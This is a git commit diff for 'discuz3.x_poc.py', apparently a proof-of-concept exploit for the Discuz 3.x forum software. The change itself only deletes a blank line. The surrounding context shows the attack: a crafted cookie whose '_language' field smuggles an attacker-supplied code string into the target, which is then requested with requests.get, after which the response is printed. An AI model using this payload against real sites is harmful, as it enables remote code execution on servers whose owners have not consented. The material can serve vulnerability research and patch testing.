104f168fbd41d416652322fe29c83c9943ad2ece
heyzm <39111949+heyzm@users.noreply.github.com>
2019-07-11 11:28:03 +0800

    Update discuz3.x_poc.py

--- discuz3.x_poc.py
+++ discuz3.x_poc.py
@@ -15,7 +15,6 @@ def poc(url,eexec):
 	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
 	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=10).text.encode('gbk', 'ignore').decode('gbk')[0:80]
 	print res
-
 	
 if __name__ == '__main__':
 	if len(sys.argv) <=2:
